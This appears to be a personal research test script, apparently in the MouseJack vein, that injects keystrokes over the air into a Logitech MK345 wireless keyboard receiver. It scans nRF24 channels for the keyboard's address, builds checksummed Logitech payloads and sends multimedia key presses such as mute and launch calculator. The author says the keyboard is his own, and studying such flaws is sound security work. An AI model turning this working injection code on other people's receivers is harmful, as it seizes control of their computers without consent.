'''
Test for injection of multimedia keys, such as volume keys, application launch buttons (calculator, email), etc.
'''

import time
import sys

sys.path.append('..')
from radio_agent import nrf24

address = [0xB4, 0xB8, 0xAE, 0xED, 0xE4] # RF address of a Logitech MK345 keyboard that I (Ron) own

# initialize the radio
radio = nrf24.nrf24()
radio.enable_lna()

# find the frequency channel
ping_payload = [0x0F, 0x0F, 0x0F, 0x0F]
print('pinging...')
radio.enter_sniffer_mode(address)
for channel in range(2, 84):
    radio.set_channel(channel)
    if radio.transmit_payload(ping_payload):
        print(channel)
        break

# function to calculate checksum for Logitech payloads
def with_checksum(payload):
    cksum = 0xFF
    for n in range(len(payload)):
        cksum = (cksum - payload[n]) & 0xFF
    cksum = (cksum + 1) & 0xFF
    payload.append(cksum)
    return payload

# transmitting payload that sets the keepalive timeout to 1200ms (=0x4B0)
set_keepalive_timeout = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00])
radio.transmit_payload(set_keepalive_timeout)
time.sleep(12 / 1000)

# the keepalive itself, includes the timeout we set before
keepalive = with_checksum([0x00, 0x40, 0x04, 0xB0])

'''
The original link: https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2
contains scan codes for media keys as well. Turns out THEY ARE IRRELEVANT.
After testing the MK345 keyboard (by capturing USB traffic on Wireshark using USBPcap), these are the mappings for its multimedia keys:
(Based on page 126 here: https://www.usb.org/sites/default/files/hut1_4.pdf)
'''
hid_scan_codes = {
    'FN+F1':  0x223, # Launch Web browser
    'FN+F2':  0x18A, # Launch Email application
    'FN+F3':  0x221, # Search
    'FN+F4':  0x192, # Launch calculator
    'FN+F5':  0x183, # Launch media player
    'FN+F6':  0xB6,  # Previous track
    'FN+F7':  0xCD,  # Play/pause track
    'FN+F8':  0xB5,  # Next track
    'FN+F9':  0xE2,  # Mute
    'FN+F10': 0xEA,  # Volume down
    'FN+F11': 0xE9,  # Volume up
    'FN+F12': 0x46   # Print screen (this is actually not a multimedia key at all, since it generates the same code as the standard Print Screen key)
}

# refer to Table 9 in the MouseJack whitepaper: Logitech Multimedia Key Payload
radio.transmit_payload(with_checksum([0x00, 0xC3, hid_scan_codes['FN+F9'], 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])) # Mute
time.sleep(12 / 1000)
radio.transmit_payload(keepalive)

# for codes more than one byte long, turns out it needs to be little endian
radio.transmit_payload(with_checksum([0x00, 0xC3] + list(hid_scan_codes['FN+F4'].to_bytes(2, byteorder='little')) + [0x00, 0x00, 0x00, 0x00, 0x00])) # Launch calculator
time.sleep(12 / 1000)
radio.transmit_payload(keepalive)

# key release packet (scan code = 0x00)
radio.transmit_payload(with_checksum([0x00, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
